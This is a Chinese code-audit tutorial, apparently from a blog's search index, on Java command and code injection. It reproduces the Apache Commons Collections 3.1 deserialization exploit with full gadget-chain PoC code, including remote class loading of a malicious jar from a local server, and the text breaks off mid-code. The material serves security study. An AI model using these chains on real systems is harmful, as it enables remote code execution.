<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【代码审计】命令注入和代码注入</title>
      <link href="//211121-153433.html"/>
      <url>//211121-153433.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-命令注入"><a href="#0x01-命令注入" class="headerlink" title="0x01 命令注入"></a>0x01 命令注入</h1><p>在开发过程中，开发人员可能需要对系统文件进行移动、删除或者执行一些系统命令，这时如果执行的命令用户可控，就会导致命令执行漏洞。</p><h2 id="1、示例"><a href="#1、示例" class="headerlink" title="1、示例"></a>1、示例</h2><p>当命令可控时，就可能会导致命令注入，例如以下代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种漏洞原理很简单，主要就是找到执行系统命令的函数，看命令是否可控。</p><p>java 程序中执行系统命令的函数如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span><span class="token punctuation">.</span>exec<span class="token class-name">Process</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">.</span>start<span class="token class-name">GroovyShell</span><span class="token punctuation">.</span>evaluate<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、命令注入的限制"><a href="#2、命令注入的限制" class="headerlink" title="2、命令注入的限制"></a>2、命令注入的限制</h2><p>对于系统命令，可以使用连接符来执行多条语句，常见连接符及含义如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span>    多个命令顺序执行，命令之间无任何逻辑关系<span class="token operator">|</span>    前面命令输出结果作为后面命令的输入内容<span class="token operator">||</span>   逻辑或，当前面命令执行失败后，后面命令才会执行，否则后面命令不执行<span class="token operator">&amp;</span>    前面命令执行后继续执行后面命令<span class="token operator">&amp;&amp;</span>   逻辑与，当前面命令执行成功后，后面命令才会执行，否则后面命令不执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 Java 环境中的命令注入，连接符的使用存在一些限制，例如以下代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"ping "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里因为 URL 可控，因此当我们输入 127.0.0.1&amp;ipconfig 时，拼接出来的系统命令就是 ping 127.0.0.1&amp;ipconfig，该命令在系统终端下是能正常运行的，但是在 Java 环境下就会运行失败，这里因为 Java 在程序处理的过程中，会将 127.0.0.1&amp;ipconfig 当做一个完整的字符串而非两条命令，因此上面的代码不存在命令注入。</p><h1 id="0x02-代码注入"><a href="#0x02-代码注入" class="headerlink" title="0x02 代码注入"></a>0x02 代码注入</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>代码注入因为是直接注入一段代码，因此要比命令注入更加灵活，危害性也更大。</p><p>这里以 Apache Commons collections 组件为例。</p><p>Apache Commons collections 组件 3.1 版本有一段利用反射来完成特定功能的代码，控制相关参数后，就可以进行代码注入。</p><p>这里攻击者可以利用反序列化的方式控制相关参数，完成注入代码，达到执行任意代码的效果。</p><p>与命令注入相比，代码注入更具有灵活性，例如在 Apache Commons collections 反序列化漏洞中直接使用 Runtime.getRuntime().exec() 执行系统命令是无回显的，但如果通过 URLLoader 远程加载类文件以及异常处理机制就可以构造出回显的利用方式。</p><p>这里就以 Apache Commons collections 反序列化漏洞为例，体验一下代码注入，因为现阶段个人水平有限，这里还不能对 Apache Commons collections 反序列化漏洞的原理进行深入分析，等后面学习到相关内容的时候不出意外应该还会碰到这个漏洞，那个时候再好好分析分析这个漏洞。</p><h2 id="2、Apache-Commons-collections-反序列化漏洞复现"><a href="#2、Apache-Commons-collections-反序列化漏洞复现" class="headerlink" title="2、Apache Commons collections 反序列化漏洞复现"></a>2、Apache Commons collections 反序列化漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>该漏洞影响了 3.1 及以下的版本，这里以 3.1 版本为例，首先下载 commons-collections-3.1.zip 文件，下载地址：<a href="https://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.1.zip">https://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.1.zip</a></p><p>解压 commons-collections-3.1.zip 可以得到 commons-collections-3.1.jar 文件，接下来打开 intelliJ IDEA，创建一个普通的 Java 项目，然后选择「文件 –&gt; 项目结构 –&gt; 库 –&gt; + –&gt; Java」，添加 commons-collections-3.1.jar 包，我使用的 jdk 版本为 1.8.0_191</p><p>接下来在「src –&gt; com –&gt; commons」目录下创建 ApacheCommonsCollectionsDemo.java 文件（右击 com.commons 软件包选择：新建 –&gt; Java 类文件）</p><h3 id="无回显利用"><a href="#无回显利用" class="headerlink" title="无回显利用"></a>无回显利用</h3><p>在 ApacheCommonsCollectionsDemo.java 文件下写入以下代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>commons</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApacheCommonsCollectionsDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//((Runtime) Runtime.class.getMethod("getRuntime").invoke()).exec("calc")</span>        <span class="token comment">//构造恶意的chain</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//通过内置的ConstantTransformer来获取Runtime类</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token comment">//通过InvokerTransformer来反射调用getMethod方法，参数是getRuntime，其后类似</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"open -a Calculator"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//普通的Map</span>        <span class="token class-name">Map</span> mp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sw"</span><span class="token punctuation">,</span> <span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 将普通的Map变成TransformedMap，并且指定变换方式为前面定义的恶意chain</span>        <span class="token class-name">Map</span> transformMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>mp<span class="token punctuation">,</span> transformChain<span class="token punctuation">,</span> transformChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改TransformedMap中的一个值，成功执行命令</span>        <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> entry<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">)</span> transformMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意第 25 行我执行的命令是 open -a Calculator，这里是 Mac 下打开计算机的命令，如果在 Windows 下则需要修改成对应命令。</p><p>运行一下代码，可以看到成功弹出计算器</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111211543622.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这里只是实现了无回显的利用方式，接下来就利用代码注入实现有回显的利用。</p><h3 id="有回显利用"><a href="#有回显利用" class="headerlink" title="有回显利用"></a>有回显利用</h3><p>这里有回显利用的方式是使用 java.net.URLClassLoader 远程加载自定义恶意类，也就是自己放在服务器上的 jar 包，然后在抛出的异常信息中获得回显结果。</p><p>因此这里首先需要先写一个恶意类，具体如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Process</span> proc <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> line<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> result <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Exception</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> e<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将恶意类打包成 jar 文件，并放到服务器上，这里因为是本地演示，就直接在本地开个 Python HTTP 服务了。</p><pre class="line-numbers language-none"><code class="language-none">javac Evil.javajar -cvf Evil.jar Evil.classpython3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 然后回到 intelliJ IDEA，在 com.commons 软件包中新建 ApacheCommonsCollectionsDemo2.java 文件，在文件中写入以下内容</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>commons</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApacheCommonsCollectionsDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getConstructor"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newInstance"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://127.0.0.1/Evil.jar"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"loadClass"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"Evil"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"Exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> entry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BadAttributeValueExpException</span> poc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> valfield <span class="token operator">=</span> poc<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token 